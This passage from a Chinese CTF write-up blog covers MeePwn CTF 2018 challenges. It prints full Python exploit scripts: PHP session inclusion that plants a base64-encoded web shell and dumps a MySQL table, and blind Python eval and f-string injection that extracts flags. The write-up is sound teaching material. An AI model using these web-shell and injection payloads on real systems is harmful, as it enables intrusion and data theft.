class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(cmd=<span class="string">'uname'</span>)</span>:</span></span><br><span class="line">    payload = dict(</span><br><span class="line">        page=<span class="string">"/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie['PHPSESSID'] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">user_email = <span class="string">"ojbk@qq.com"</span></span><br><span class="line">salt = <span class="string">'ms_g00d_0ld_g4m3'</span></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'8es749ivbfetvsmsc0ggthr2e5'</span>,</span><br><span class="line">    _role=<span class="string">'a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'</span>,</span><br><span class="line">    a=<span class="string">"php://filter/convert.base64-decode/resource=upload/%s/command.txt"</span> %</span><br><span class="line">    hashlib.md5(salt + user_email).hexdigest())</span><br><span class="line">change_name(<span class="string">'&lt;?=include"$_COOKIE[a]'</span>)</span><br><span class="line"><span class="comment"># 修改用户名使读Session文件时包含进Cookie['a']，即command.txt得base64解码</span></span><br><span class="line">cmd = base64.b64encode(<span class="string">"&lt;?=`$_GET[f]`;"</span>)  <span class="comment">#'PD89YCRfR0VUW2ZdYDs='</span></span><br><span class="line">command(cmd[:<span class="number">19</span>])  <span class="comment"># 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码</span></span><br><span class="line">give_pet(user_email)  <span class="comment"># 使Session文件中的action值为"Give $pet to  player $username"</span></span><br><span class="line">cmd = <span class="string">"mysql -e'select * from mapl_config' -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story"</span></span><br><span class="line"><span class="keyword">print</span> shell(cmd)</span><br><span class="line"><span class="comment"># mapl_salt      mapl_key        mapl_now_get_your_flag</span></span><br><span class="line"><span class="comment"># ms_g00d_0ld_g4m3        You_Never_Guess_This_Tsug0d_1337        MeePwnCTF&#123;__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___&#125;</span></span><br></pre></td></tr></table></figure><h1 id="另一种思路：拼接-SESSION-变量"><a href="#另一种思路：拼接-SESSION-变量" class="headerlink" title="另一种思路：拼接$_SESSION 变量"></a>另一种思路：拼接<code>$_SESSION</code> 变量</h1><p>另外， <a href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html" target="_blank" rel="noopener">这篇文章</a> 里提供的一种拼接<code>$_SESSION</code> 变量的做法虽不比前者综合利用多处缺陷的优雅，但最大化地利用了单点的缺陷，很有创意，值得学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    payload = dict(pet=<span class="string">"babydragon"</span>, email=user_email, submit=<span class="string">"Give"</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">'?page=admin.php'</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(cmd=<span class="string">'uname'</span>)</span>:</span></span><br><span class="line">    payload = dict(</span><br><span class="line">        page=<span class="string">"/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie['PHPSESSID'] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">user_email = <span class="string">"mapl@qq.com"</span></span><br><span class="line">salt = <span class="string">'ms_g00d_0ld_g4m3'</span></span><br><span class="line"></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'8es749ivbfetvsmsc0ggthr2e5'</span>,</span><br><span class="line">    _role=<span class="string">'a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(s)</span>:</span></span><br><span class="line">    change_name(s)</span><br><span class="line">    give_pet(user_email)</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line">    <span class="keyword">print</span> shell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]='*/'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=';'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='"'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='&lt;'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='?'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='='/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=' '/*</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'`echo PD89YCRfR0VUWzFdYDsK|base64 -d &gt;&gt; upload/%s/command.txt`'</span> % hashlib.md5(</span><br><span class="line">    salt + user_email).hexdigest()</span><br><span class="line">payload3 = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=''/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='?'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='&gt;'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]?&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxx</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload1.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload2:</span><br><span class="line">        p = <span class="string">"&lt;?=$_SESSION[a].='%s'/*"</span> % c</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload3.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xxx()</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(salt + user_email).hexdigest()</span><br><span class="line"><span class="comment"># 可通过运行结果理解payload的巧妙</span></span><br><span class="line"><span class="comment"># 结果存放在</span></span><br><span class="line"><span class="comment"># https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt</span></span><br><span class="line"><span class="comment"># shell at </span></span><br><span class="line"><span class="comment"># http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt&amp;1=ls</span></span><br></pre></td></tr></table></figure><p><img src="1532114006803.png" alt="1532114006803"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://ctftime.org/writeup/10418" target="_blank" rel="noopener">https://ctftime.org/writeup/10418</a> </p><p><a href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html" target="_blank" rel="noopener">MeePwn CTF 2018 Qual - Maple Story</a>   </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入</title>
      <link href="/180719MeePwn_py3Inject/"/>
      <url>/180719MeePwn_py3Inject/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首发 <a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p><h1 id="PyCalx"><a href="#PyCalx" class="headerlink" title="PyCalx"></a>PyCalx</h1><blockquote><p>This code is supposed to be unexploitable :/ another pyjail?<br><a href="http://178.128.96.203/cgi-bin/server.py?source=1" target="_blank" rel="noopener">[Source]</a><br><a href="http://178.128.96.203/cgi-bin/server.py?value1=123&amp;op=%3D%3D&amp;value2=123" target="_blank" rel="noopener">Try this </a>or <a href="http://178.128.96.203/cgi-bin/server.py?value1=abc&amp;op=%3D%3D&amp;value2=abc" target="_blank" rel="noopener">this</a><br>Notice: The flag may contain non alphabetic characters (but still printable)</p></blockquote><p>本题由Python的 <code>eval()</code> 函数参数可控且直接拼接引发的注入，采用二分法盲注。</p><p>server.py源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">'/var/www/flag'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">OK_200 = <span class="string">"some HTML code"</span></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'source'</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">'source'</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">'1'</span>:</span><br><span class="line">    print(<span class="string">'&lt;pre&gt;'</span> + escape(str(open(__file__, <span class="string">'r'</span>).read())) + <span class="string">'&lt;/pre&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'value1'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'value2'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'op'</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>,</span><br><span class="line">                     <span class="string">'"'</span>]  <span class="comment"># I don't like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid value&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'!'</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid op&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">'op'</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">'value1'</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">'value2'</span>].value)</span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">'&lt;center&gt;Types of the values don\'t match&lt;/center&gt;'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">'&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class="col-md-8"&gt;&lt;pre&gt;'</span></span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt;&gt; print('</span> + escape(calc_eval) + <span class="string">')'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">'True'</span> <span class="keyword">or</span> result == <span class="string">'False'</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(</span><br><span class="line">                <span class="string">"Invalid"</span></span><br><span class="line">            )  <span class="comment"># Sorry we don't support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Invalid"</span>)</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure><p>大意如下：</p><ul><li>cgi会处理source，value1，value2，op四个参数。</li><li>如果source=1则打印源代码。</li><li>value1，value2，op三个参数都有值时进一步处理。<ul><li>value1，value2至少1个字符，至多64个，且不包含黑名单<code>()[]&#39;&quot;</code> 里的字符。</li><li>op至少1个字符，至多2个，且首字符必须在白名单<code>+-*/=!</code> 里。</li><li>value1,value2要么都是只包含<code>[0-9]</code>，要么都包含其他字符。</li><li>执行<code>str(eval(str(repr(value1)) + str(op) + str(repr(value2))))</code> ，且只有结果是bool值或只包含<code>[0-9]</code> 时才会输出。<ul><li>注：repr返回对象的可打印形式，和反引号包裹效果一致，对大多数类型，他会返有一个字符串，使其可以作为代码直接传入eval执行。</li></ul></li></ul></li></ul><p>解题思路：<code>op</code> 允许两个字符，且第二个字符是任意的，那么如果是一个单引号，就能混淆代码和数据，起到类似SQL注入的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+"</span>)+str(repr(<span class="string">"b"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">'b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+'"</span>)+str(repr(<span class="string">"&lt; b#"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">''</span>&lt; b<span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://178.128.96.203/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment"># print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">'Invalid'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'True'</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, "\t",</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, v2, op, s = <span class="string">'x'</span>, <span class="string">"+FLAG&lt;value1+source#"</span>, <span class="string">"+'"</span>, <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.66666666666666_([_((you_passed_this?]]]]]])&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531905259492.png" alt="1531905259492"></p><h1 id="PyCalx2"><a href="#PyCalx2" class="headerlink" title="PyCalx2"></a>PyCalx2</h1><blockquote><p>You should solve <code>PyCalx</code> first. </p><p><a href="http://206.189.223.3/cgi-bin/server.py?source=1" target="_blank" rel="noopener">http://206.189.223.3/cgi-bin/server.py?source=1</a>  </p></blockquote><p><code>server.py</code> 只改动了一行代码，将<code>op = get_op(arguments[&#39;op&#39;].value)</code> 变成了 <code>op = get_op(get_value(arguments[&#39;op&#39;].value))</code>  ，也就是说将<code>op</code> 参数也进行了黑名单过滤，于是 <code>op</code> 的第二个字符就不能是单引号，第一题的方法也就失效了。</p><p>结合题目提示和第一题的flag去寻找Python3.6的新特性，用到了这个 <code>f-string</code> ，详见<a href="https://www.python.org/dev/peps/pep-0498/" target="_blank" rel="noopener">PEP 498 – Literal String Interpolation</a> 。简言之就是可以在字符串中方便地直接插入表达式，以<code>f</code> 开头，表达式插在大括号<code>{}</code> 里，在运行时表达式会被计算并替换成对应的值。</p><p>本题主要是利用这个特性在字符串里插入比较的表达式，剩下的就和上题一样了。插法不尽相同，CTF Time上的WP里有这么两种，相信还可以有其他的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;FLAG&lt;source or 14:x&#125;'</span>)) <span class="comment"># 14的十六进制表示时'e'</span></span><br><span class="line"><span class="string">"'T'+f'ru&#123;FLAG&lt;source or 14:x&#125;'"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;1 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'Tru1'</span> <span class="comment"># 返回Invalid</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;0 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'</span>))</span><br><span class="line"><span class="string">"'Tru'+f'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'"</span></span><br><span class="line"><span class="comment"># &#123;FLAG&lt;source:1&#125;的值相当于printf("%1f",FLAG&lt;source)的结果，有0和1两种可能。</span></span><br><span class="line"><span class="comment">#这边sys.exit.__name__等价于字符串'exit'，考虑到已经import escape，直接用escape.__name__也可。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;1:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;0:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="comment">#报错，返回Invalid</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: <span class="string">'='</span> alignment <span class="keyword">not</span> allowed <span class="keyword">in</span> string format specifier</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://206.189.223.3/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'Invalid'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span 